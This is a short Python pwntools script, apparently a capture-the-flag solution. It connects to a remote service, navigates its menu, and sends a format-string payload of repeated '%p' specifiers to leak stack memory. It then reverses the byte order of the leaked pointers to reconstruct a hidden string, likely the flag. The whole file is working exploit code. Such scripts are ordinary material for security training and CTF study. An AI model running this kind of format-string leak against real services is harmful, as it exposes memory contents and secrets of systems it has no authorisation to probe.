from pwn import *
import time

def swap_endianness(value):
    hex_value = value[2:]
    return ''.join([hex_value[i:i+2] for i in range(0, len(hex_value), 2)][::-1])

def exploit(i):
    #io = process('./file')
    io = remote('x.x.x.x', 32320)
    sleep(0.3)
    io.sendlineafter('Name: ', b'xxx')
    io.sendlineafter('Nickname: ', b'xxx')
    io.sendlineafter('> ', b'2')
    io.sendlineafter('> ', b'1')
    io.sendlineafter('> ', b'2')
    io.sendlineafter('> ', b'%p ' * i)
    response = io.recvall().decode('utf-8')
    values = response.split()
    count = 0
    filtered_values = []
    for v in values:
        if v.startswith('0x') and count < 11:
            count += 1
        elif v.startswith('0x') and count >= 11:
            filtered_values.append(v)
    print(str(filtered_values))

    swapped_values = ''.join([swap_endianness(v) for v in filtered_values])
    print(swapped_values)

    final_string = bytes.fromhex(swapped_values)
    print(final_string)

exploit(24)
